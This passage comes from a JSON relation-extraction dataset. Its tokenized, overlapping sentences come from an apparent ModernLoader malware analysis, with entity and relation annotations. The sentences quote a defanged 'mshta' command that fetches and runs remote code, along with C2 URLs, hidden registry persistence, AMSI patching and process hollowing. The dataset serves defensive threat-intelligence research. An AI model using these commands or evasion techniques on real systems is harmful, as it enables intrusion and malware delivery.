"sent_id": 0, "global_pos": [7, 7], "name": "HTA", "pos": [7, 8], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [16, 16], "name": "HTA", "pos": [4, 5], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [20, 20], "name": "VB script", "pos": [8, 10], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [27, 27], "name": "PowerShell code", "pos": [15, 17], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [30, 30], "name": "hxxp : //31.41.244.231/0x ? 0=Loader", "pos": [18, 23], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [43, 43], "name": "loading process", "pos": [31, 33], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [47, 47], "name": "autorunnn.exe", "pos": [1, 2], "index": "7_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [60, 60], "name": "registry", "pos": [14, 15], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [76, 76], "name": "program", "pos": [1, 2], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [99, 99], "name": "PowerShell loader", "pos": [24, 26], "index": "10_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [104, 104], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [29, 34], "index": "11_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [124, 124], "name": "PowerShell", "pos": [3, 4], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [145, 145], "name": "PowerShell loader", "pos": [5, 7], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [161, 161], "name": "PowerShell process", "pos": [21, 23], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [178, 178], "name": "payload", "pos": [13, 14], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [185, 185], "name": "payload", "pos": [20, 21], "index": "16_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [197, 197], "name": "RegSvcs.exe", "pos": [32, 33], "index": "17_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "EX", "evidence": [1], "h": 2, "t": 3}, {"r": "FR", "evidence": [1], "h": 2, "t": 4}, {"r": "RF", "evidence": [1], "h": 2, "t": 5}, {"r": "FR", "evidence": [1], "h": 2, "t": 6}, {"r": "RD", "evidence": [1, 2], "h": 6, "t": 8}, {"r": "CO", "evidence": [1, 2], "h": 6, "t": 7}, {"r": "CO", "evidence": [1, 2, 3], "h": 6, "t": 9}, {"r": "WR", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "RF", "evidence": [3], "h": 9, "t": 11}, {"r": "FR", "evidence": [3, 4, 5], "h": 9, "t": 12}, {"r": "EX", "evidence": [3, 4, 5], "t": 10, "h": 12}, {"r": "FR", "evidence": [5, 6], "h": 12, "t": 14}, {"r": "CO", "evidence": [5, 6], "h": 12, "t": 13}, {"r": "FR", "evidence": [6, 7], "h": 13, "t": 15}, {"r": "FR", "evidence": [6, 7], "h": 14, "t": 17}, {"r": "CO", "evidence": [7], "t": 15, "h": 16}]}, {"title": "05_g02-4", "sents": [["Once", "deobfuscated", ",", "the", "HTA", "file", "executes", "the", "VB", "script", "code", "to", "download", "and", "run", "PowerShell", "code", "from", "hxxp", ":", "//31.41.244.231/0x", "?", "0=Loader", ",", "which", "launches", "the", "next", "stage", "of", "the", "loading", "process", "."], ["The", "autorunnn.exe", "module", "is", "a", "SharpHide", "variant", "that", "creates", "a", "hidden", "(", "null-terminated", ")", "registry", "key", "by", "adding", "a", "null", "byte", "in", "front", "of", "the", "UNICODE_STRING", "key", "valuename", "."], ["The", "program", "also", "creates", "a", "scheduled", "task", "named", "``", "OneDrive", "Standalone", "Update", "Task", "''", "that", "runs", "the", "sams", "command", "to", "download", "and", "run", "the", "PowerShell", "loader", ":", "``", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["The", "modified", "SharpHide", "code", "hides", "the", "registry", "startup", "entry", "."], ["The", "URL", "serves", "PowerShell", "code", "that", "will", "be", "executed", "on", "the", "system", "as", "part", "of", "the", "logon", "sequence", "."], ["The", "next", "stage", "is", "the", "PowerShell", "loader", "which", "contains", "three", "embedded", "modules", "loaded", "using", "reflection", "as", "additional", ".NET", "assemblies", "into", "the", "PowerShell", "process", "space", "."], ["The", "first", "module", "disables", "AMSI", "scanning", "functionality", ",", "the", "second", "is", "the", "final", "payload", ",", "and", "the", "last", "injects", "the", "payload", "into", "the", "process", "space", "of", "a", "newly", "created", "process", ",", "usually", "RegSvcs.exe", "."], ["Killamsi.dll", "is", "stored", "as", "a", "base64-encoded", "string", "split", "between", "the", "first", "two", "encoded", "characters", "and", "the", "rest", "of", "the", "encoded", "assembly", "DLL", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "HTA", "pos": [4, 5], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "VB script", "pos": [8, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [15, 15], "name": "PowerShell code", "pos": [15, 17], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [18, 18], "name": "hxxp : //31.41.244.231/0x ? 0=Loader", "pos": [18, 23], "index": "3_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [31, 31], "name": "loading process", "pos": [31, 33], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [35, 35], "name": "autorunnn.exe", "pos": [1, 2], "index": "5_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [48, 48], "name": "registry", "pos": [14, 15], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [64, 64], "name": "program", "pos": [1, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [87, 87], "name": "PowerShell loader", "pos": [24, 26], "index": "8_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [92, 92], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [29, 34], "index": "9_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [112, 112], "name": "PowerShell", "pos": [3, 4], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [133, 133], "name": "PowerShell loader", "pos": [5, 7], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [149, 149], "name": "PowerShell process", "pos": [21, 23], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [166, 166], "name": "payload", "pos": [13, 14], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [173, 173], "name": "payload", "pos": [20, 21], "index": "14_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [185, 185], "name": "RegSvcs.exe", "pos": [32, 33], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [187, 187], "name": "Killamsi.dll", "pos": [0, 1], "index": "16_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 3}, {"r": "FR", "evidence": [0], "h": 0, "t": 4}, {"r": "RD", "evidence": [0, 1], "h": 4, "t": 6}, {"r": "CO", "evidence": [0, 1], "h": 4, "t": 5}, {"r": "CO", "evidence": [0, 1, 2], "h": 4, "t": 7}, {"r": "WR", "evidence": [1], "h": 5, "t": 6}, {"r": "WR", "evidence": [2], "h": 7, "t": 8}, {"r": "RF", "evidence": [2], "h": 7, "t": 9}, {"r": "FR", "evidence": [2, 3, 4], "h": 7, "t": 10}, {"r": "EX", "evidence": [2, 3, 4], "t": 8, "h": 10}, {"r": "FR", "evidence": [4, 5], "h": 10, "t": 12}, {"r": "CO", "evidence": [4, 5], "h": 10, "t": 11}, {"r": "FR", "evidence": [5, 6], "h": 11, "t": 13}, {"r": "FR", "evidence": [5, 6], "h": 12, "t": 15}, {"r": "FR", "evidence": [5, 6, 7], "h": 11, "t": 16}, {"r": "CO", "evidence": [6], "t": 13, "h": 14}]}, {"title": "05_g02-5", "sents": [["The", "autorunnn.exe", "module", "is", "a", "SharpHide", "variant", "that", "creates", "a", "hidden", "(", "null-terminated", ")", "registry", "key", "by", "adding", "a", "null", "byte", "in", "front", "of", "the", "UNICODE_STRING", "key", "valuename", "."], ["The", "program", "also", "creates", "a", "scheduled", "task", "named", "``", "OneDrive", "Standalone", "Update", "Task", "''", "that", "runs", "the", "sams", "command", "to", "download", "and", "run", "the", "PowerShell", "loader", ":", "``", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["The", "modified", "SharpHide", "code", "hides", "the", "registry", "startup", "entry", "."], ["The", "URL", "serves", "PowerShell", "code", "that", "will", "be", "executed", "on", "the", "system", "as", "part", "of", "the", "logon", "sequence", "."], ["The", "next", "stage", "is", "the", "PowerShell", "loader", "which", "contains", "three", "embedded", "modules", "loaded", "using", "reflection", "as", "additional", ".NET", "assemblies", "into", "the", "PowerShell", "process", "space", "."], ["The", "first", "module", "disables", "AMSI", "scanning", "functionality", ",", "the", "second", "is", "the", "final", "payload", ",", "and", "the", "last", "injects", "the", "payload", "into", "the", "process", "space", "of", "a", "newly", "created", "process", ",", "usually", "RegSvcs.exe", "."], ["Killamsi.dll", "is", "stored", "as", "a", "base64-encoded", "string", "split", "between", "the", "first", "two", "encoded", "characters", "and", "the", "rest", "of", "the", "encoded", "assembly", "DLL", "."], ["The", "DLL", "contains", "obfuscated", "code", "that", "attempts", "to", "patch", "Microsoft", "'s", "AMSI", "interface", "(", "amsi.dll", ")", "AmsiScanBuffer", "function", "with", "the", "code", "to", "return", "an", "error", "value", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "autorunnn.exe", "pos": [1, 2], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [14, 14], "name": "registry", "pos": [14, 15], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [30, 30], "name": "program", "pos": [1, 2], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [53, 53], "name": "PowerShell loader", "pos": [24, 26], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [58, 58], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [29, 34], "index": "4_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [78, 78], "name": "PowerShell", "pos": [3, 4], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [99, 99], "name": "PowerShell loader", "pos": [5, 7], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [115, 115], "name": "PowerShell process", "pos": [21, 23], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [132, 132], "name": "payload", "pos": [13, 14], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [139, 139], "name": "payload", "pos": [20, 21], "index": "9_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [151, 151], "name": "RegSvcs.exe", "pos": [32, 33], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [153, 153], "name": "Killamsi.dll", "pos": [0, 1], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [177, 177], "name": "DLL", "pos": [1, 2], "index": "12_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [190, 190], "name": "amsi.dll", "pos": [14, 15], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "RF", "evidence": [1], "h": 2, "t": 4}, {"r": "FR", "evidence": [1, 2, 3], "h": 2, "t": 5}, {"r": "EX", "evidence": [1, 2, 3], "t": 3, "h": 5}, {"r": "FR", "evidence": [3, 4], "h": 5, "t": 7}, {"r": "CO", "evidence": [3, 4], "h": 5, "t": 6}, {"r": "FR", "evidence": [4, 5], "h": 6, "t": 8}, {"r": "FR", "evidence": [4, 5], "h": 7, "t": 10}, {"r": "FR", "evidence": [4, 5, 6], "h": 6, "t": 11}, {"r": "CO", "evidence": [5], "t": 8, "h": 9}, {"r": "RD", "evidence": [6, 7], "h": 11, "t": 13}, {"r": "CO", "evidence": [6, 7], "h": 11, "t": 12}, {"r": "WR", "evidence": [7], "h": 12, "t": 13}]}, {"title": "05_g02-6", "sents": [["The", "program", "also", "creates", "a", "scheduled", "task", "named", "``", "OneDrive", "Standalone", "Update", "Task", "''", "that", "runs", "the", "sams", "command", "to", "download", "and", "run", "the", "PowerShell", "loader", ":", "``", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["The", "modified", "SharpHide", "code", "hides", "the", "registry", "startup", "entry", "."], ["The", "URL", "serves", "PowerShell", "code", "that", "will", "be", "executed", "on", "the", "system", "as", "part", "of", "the", "logon", "sequence", "."], ["The", "next", "stage", "is", "the", "PowerShell", "loader", "which", "contains", "three", "embedded", "modules", "loaded", "using", "reflection", "as", "additional", ".NET", "assemblies", "into", "the", "PowerShell", "process", "space", "."], ["The", "first", "module", "disables", "AMSI", "scanning", "functionality", ",", "the", "second", "is", "the", "final", "payload", ",", "and", "the", "last", "injects", "the", "payload", "into", "the", "process", "space", "of", "a", "newly", "created", "process", ",", "usually", "RegSvcs.exe", "."], ["Killamsi.dll", "is", "stored", "as", "a", "base64-encoded", "string", "split", "between", "the", "first", "two", "encoded", "characters", "and", "the", "rest", "of", "the", "encoded", "assembly", "DLL", "."], ["The", "DLL", "contains", "obfuscated", "code", "that", "attempts", "to", "patch", "Microsoft", "'s", "AMSI", "interface", "(", "amsi.dll", ")", "AmsiScanBuffer", "function", "with", "the", "code", "to", "return", "an", "error", "value", "."], ["The", "last", "module", "in", "the", "loader", "file", "is", "``", "friday.dll", "''", ".", "It", "creates", "a", "new", "process", "and", "places", "the", "next", "injector", "stage", "into", "the", "newly", "created", "RegSvcs.exe", "process", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "program", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [24, 24], "name": "PowerShell loader", "pos": [24, 26], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [29, 29], "name": "hxxp : //go.clss.cl/0k # =GoogleWindowsAnalyticsConfiguration", "pos": [29, 34], "index": "2_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [49, 49], "name": "PowerShell", "pos": [3, 4], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [70, 70], "name": "PowerShell loader", "pos": [5, 7], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [86, 86], "name": "PowerShell process", "pos": [21, 23], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [103, 103], "name": "payload", "pos": [13, 14], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [110, 110], "name": "payload", "pos": [20, 21], "index": "7_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [122, 122], "name": "RegSvcs.exe", "pos": [32, 33], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [124, 124], "name": "Killamsi.dll", "pos": [0, 1], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [148, 148], "name": "DLL", "pos": [1, 2], "index": "10_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [161, 161], "name": "amsi.dll", "pos": [14, 15], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [183, 183], "name": "friday.dll", "pos": [9, 10], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [186, 186], "name": "It", "pos": [12, 13], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [190, 190], "name": "process", "pos": [16, 17], "index": "14_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [201, 201], "name": "RegSvcs.exe", "pos": [27, 28], "index": "15_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "FR", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "EX", "evidence": [0, 1, 2], "t": 1, "h": 3}, {"r": "FR", "evidence": [2, 3], "h": 3, "t": 5}, {"r": "CO", "evidence": [2, 3], "h": 3, "t": 4}, {"r": "FR", "evidence": [3, 4], "h": 4, "t": 6}, {"r": "FR", "evidence": [3, 4], "h": 5, "t": 8}, {"r": "FR", "evidence": [3, 4, 5], "h": 4, "t": 9}, {"r": "CO", "evidence": [4], "t": 6, "h": 7}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 6, "t": 13}, {"r": "RD", "evidence": [5, 6], "h": 9, "t": 11}, {"r": "CO", "evidence": [5, 6], "h": 9, "t": 10}, {"r": "WR", "evidence": [6], "h": 10, "t": 11}, {"r": "FR", "evidence": [7], "h": 13, "t": 14}, {"r": "EX", "evidence": [7], "t": 12, "h": 14}, {"r": "IJ", "evidence": [7], "h": 14, "t": 15}]}, {"title": "05_g02-7", "sents": [["The", "modified", "SharpHide", "code", "hides", "the", "registry", "startup", "entry", "."], ["The", "URL", "serves", "PowerShell", "code", "that", "will", "be", "executed", "on", "the", "system", "as", "part", "of", "the", "logon", "sequence", "."], ["The", "next", "stage", "is", "the", "PowerShell", "loader", "which", "contains", "three", "embedded", "modules", "loaded", "using", "reflection", "as", "additional", ".NET", "assemblies", "into", "the", "PowerShell", "process", "space", "."], ["The", "first", "module", "disables", "AMSI", "scanning", "functionality", ",", "the", "second", "is", "the", "final", "payload", ",", "and", "the", "last", "injects", "the", "payload", "into", "the", "process", "space", "of", "a", "newly", "created", "process", ",", "usually", "RegSvcs.exe", "."], ["Killamsi.dll", "is", "stored", "as", "a", "base64-encoded", "string", "split", "between", "the", "first", "two", "encoded", "characters", "and", "the", "rest", "of", "the", "encoded", "assembly", "DLL", "."], ["The", "DLL", "contains", "obfuscated", "code", "that", "attempts", "to", "patch", "Microsoft", "'s", "AMSI", "interface", "(", "amsi.dll", ")", "AmsiScanBuffer", "function", "with", "the", "code", "to", "return", "an", "error", "value", "."], ["The", "last", "module", "in", "the", "loader", "file", "is", "``", "friday.dll", "''", ".", "It", "creates", "a", "new", "process", "and", "places", "the", "next", "injector", "stage", "into", "the", "newly", "created", "RegSvcs.exe", "process", "."], ["The", "second-stage", "injector", "is", "an", "assembly", ":", "Managament.inf", ".", "It", "creates", "an", "instance", "of", "svchost.exe", "process", "and", "injects", "code", "using", "process-hollowing", "to", "load", "the", "final", "payload", "stored", "in", "the", "initial", "PowerShell", "loader", "script", "."]], "vertexSet": [[{"type": "TP", "sent_id": 1, "global_pos": [13, 13], "name": "PowerShell", "pos": [3, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [34, 34], "name": "PowerShell loader", "pos": [5, 7], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [50, 50], "name": "PowerShell process", "pos": [21, 23], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [67, 67], "name": "payload", "pos": [13, 14], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [74, 74], "name": "payload", "pos": [20, 21], "index": "4_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [86, 86], "name": "RegSvcs.exe", "pos": [32, 33], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [88, 88], "name": "Killamsi.dll", "pos": [0, 1], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [112, 112], "name": "DLL", "pos": [1, 2], "index": "7_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [125, 125], "name": "amsi.dll", "pos": [14, 15], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [147, 147], "name": "friday.dll", "pos": [9, 10], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [150, 150], "name": "It", "pos": [12, 13], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [154, 154], "name": "process", "pos": [16, 17], "index": "11_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [165, 165], "name": "RegSvcs.exe", "pos": [27, 28], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [177, 177], "name": "It", "pos": [9, 10], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [182, 182], "name": "svchost.exe", "pos": [14, 15], "index": "14_0"}]], "labels": [{"r": "FR", "evidence": [1, 2], "h": 0, "t": 2}, {"r": "CO", "evidence": [1, 2], "h": 0, "t": 1}, {"r": "FR", "evidence": [2, 3], "h": 1, "t": 3}, {"r": "FR", "evidence": [2, 3], "h": 2, "t": 5}, {"r": "FR", "evidence": [2, 3, 4], "h": 1, "t": 6}, {"r": "CO", "evidence": [3], "t": 3, "h": 4}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 3, "t": 10}, {"r": "RD", "evidence": [4, 5], "h": 6, "t": 8}, {"r": "CO", "evidence": [4, 5], "h": 6, "t": 7}, {"r": "WR", "evidence": [5], "h": 7, "t": 8}, {"r": "FR", "evidence": [6], "h": 10, "t": 11}, {"r": "EX", "evidence": [6], "t": 9, "h": 11}, {"r": "IJ", "evidence": [6], "h": 11, "t": 12}, {"r": "FR", "evidence": [6, 7], "h": 12, "t": 13}, {"r": "CO", "evidence": [6, 7], "h": 11, "t": 14}]}, {"title": "05_g02-8", "sents": [["The", "URL", "serves", "PowerShell", "code", "that", "will", "be", "executed", "on", "the", "system", "as", "part", "of", "the", "logon", "sequence", "."], ["The", "next", "stage", "is", "the", "PowerShell", "loader", "which", "contains", "three", "embedded", "modules", "loaded", "using", "reflection", "as", "additional", ".NET", "assemblies", "into", "the", "PowerShell", "process", "space", "."], ["The", "first", "module", "disables", "AMSI", "scanning", "functionality", ",", "the", "second", "is", "the", "final", "payload", ",", "and", "the", "last", "injects", "the", "payload", "into", "the", "process", "space", "of", "a", "newly", "created", "process", ",", "usually", "RegSvcs.exe", "."], ["Killamsi.dll", "is", "stored", "as", "a", "base64-encoded", "string", "split", "between", "the", "first", "two", "encoded", "characters", "and", "the", "rest", "of", "the", "encoded", "assembly", "DLL", "."], ["The", "DLL", "contains", "obfuscated", "code", "that", "attempts", "to", "patch", "Microsoft", "'s", "AMSI", "interface", "(", "amsi.dll", ")", "AmsiScanBuffer", "function", "with", "the", "code", "to", "return", "an", "error", "value", "."], ["The", "last", "module", "in", "the", "loader", "file", "is", "``", "friday.dll", "''", ".", "It", "creates", "a", "new", "process", "and", "places", "the", "next", "injector", "stage", "into", "the", "newly", "created", "RegSvcs.exe", "process", "."], ["The", "second-stage", "injector", "is", "an", "assembly", ":", "Managament.inf", ".", "It", "creates", "an", "instance", "of", "svchost.exe", "process", "and", "injects", "code", "using", "process-hollowing", "to", "load", "the", "final", "payload", "stored", "in", "the", "initial", "PowerShell", "loader", "script", "."], ["The", "injected", "payload", "is", "Client.exe", ",", "a", "ModernLoader", "instance", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [3, 3], "name": "PowerShell", "pos": [3, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [24, 24], "name": "PowerShell loader", "pos": [5, 7], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [40, 40], "name": "PowerShell process", "pos": [21, 23], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [57, 57], "name": "payload", "pos": [13, 14], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [64, 64], "name": "payload", "pos": [20, 21], "index": "4_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [76, 76], "name": "RegSvcs.exe", "pos": [32, 33], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [78, 78], "name": "Killamsi.dll", "pos": [0, 1], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [102, 102], "name": "DLL", "pos": [1, 2], "index": "7_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [115, 115], "name": "amsi.dll", "pos": [14, 15], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [137, 137], "name": "friday.dll", "pos": [9, 10], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [140, 140], "name": "It", "pos": [12, 13], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [144, 144], "name": "process", "pos": [16, 17], "index": "11_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [155, 155], "name": "RegSvcs.exe", "pos": [27, 28], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [167, 167], "name": "It", "pos": [9, 10], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [172, 172], "name": "svchost.exe", "pos": [14, 15], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [196, 196], "name": "Client.exe", "pos": [4, 5], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [199, 199], "name": "ModernLoader", "pos": [7, 8], "index": "16_0"}]], "labels": [{"r": "FR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "FR", "evidence": [1, 2], "h": 1, "t": 3}, {"r": "FR", "evidence": [1, 2], "h": 2, "t": 5}, {"r": "FR", "evidence": [1, 2, 3], "h": 1, "t": 6}, {"r": "CO", "evidence": [2], "t": 3, "h": 4}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 3, "t": 10}, {"r": "RD", "evidence": [3, 4], "h": 6, "t": 8}, {"r": "CO", "evidence": [3, 4], "h": 6, "t": 7}, {"r": "WR", "evidence": [4], "h": 7, "t": 8}, {"r": "FR", "evidence": [5], "h": 10, "t": 11}, {"r": "EX", "evidence": [5], "t": 9, "h": 11}, {"r": "IJ", "evidence": [5], "h": 11, "t": 12}, {"r": "FR", "evidence": [5, 6], "h": 12, "t": 13}, {"r": "CO", "evidence": [5, 6], "h": 11, "t": 14}, {"r": "FR", "evidence": [6, 7], "h": 14, "t": 15}, {"r": "CO", "evidence": [7], "h": 15, "t": 16}]}, {"title": "05_g02-9", "sents": [["The", "next", "stage", "is", "the", "PowerShell", "loader", "which", "contains", "three", "embedded", "modules", "loaded", "using", "reflection", "as", "additional", ".NET", "assemblies", "into", "the", "PowerShell", "process", "space", "."], ["The", "first", "module", "disables", "AMSI", "scanning", "functionality", ",", "the", "second", "is", "the", "final", "payload", ",", "and", "the", "last", "injects", "the", "payload", "into", "the", "process", "space", "of", "a", "newly", "created", "process", ",", "usually", "RegSvcs.exe", "."], ["Killamsi.dll", "is", "stored", "as", "a", "base64-encoded", "string", "split", "between", "the", "first", "two", "encoded", "characters", "and", "the", "rest", "of", "the", "encoded", "assembly", "DLL", "."], ["The", "DLL", "contains", "obfuscated", "code", "that", "attempts", "to", "patch", "Microsoft", "'s", "AMSI", "interface", "(", "amsi.dll", ")", "AmsiScanBuffer", "function", "with", "the", "code", "to", "return", "an", "error", "value", "."], ["The", "last", "module", "in", "the", "loader", "file", "is", "``", "friday.dll", "''", ".", "It", "creates", "a", "new", "process", "and", "places", "the", "next", "injector", "stage", "into", "the", "newly", "created", "RegSvcs.exe", "process", "."], ["The", "second-stage", "injector", "is", "an", "assembly", ":", "Managament.inf", ".", "It", "creates", "an", "instance", "of", "svchost.exe", "process", "and", "injects", "code", "using", "process-hollowing", "to", "load", "the", "final", "payload", "stored", "in", "the", "initial", "PowerShell", "loader", "script", "."], ["The", "injected", "payload", "is", "Client.exe", ",", "a", "ModernLoader", "instance", "."], ["The", "constructor", "initializes", "the", "bot", "with", "a", "hardcoded", "C2", "URL", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "PowerShell loader", "pos": [5, 7], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [21, 21], "name": "PowerShell process", "pos": [21, 23], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [38, 38], "name": "payload", "pos": [13, 14], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [45, 45], "name": "payload", "pos": [20, 21], "index": "3_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [57, 57], "name": "RegSvcs.exe", "pos": [32, 33], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [59, 59], "name": "Killamsi.dll", "pos": [0, 1], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [83, 83], "name": "DLL", "pos": [1, 2], "index": "6_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [96, 96], "name": "amsi.dll", "pos": [14, 15], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [118, 118], "name": "friday.dll", "pos": [9, 10], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [121, 121], "name": "It", "pos": [12, 13], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [125, 125], "name": "process", "pos": [16, 17], "index": "10_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [136, 136], "name": "RegSvcs.exe", "pos": [27, 28], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [148, 148], "name": "It", "pos": [9, 10], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [153, 153], "name": "svchost.exe", "pos": [14, 15], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [177, 177], "name": "Client.exe", "pos": [4, 5], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [180, 180], "name": "ModernLoader", "pos": [7, 8], 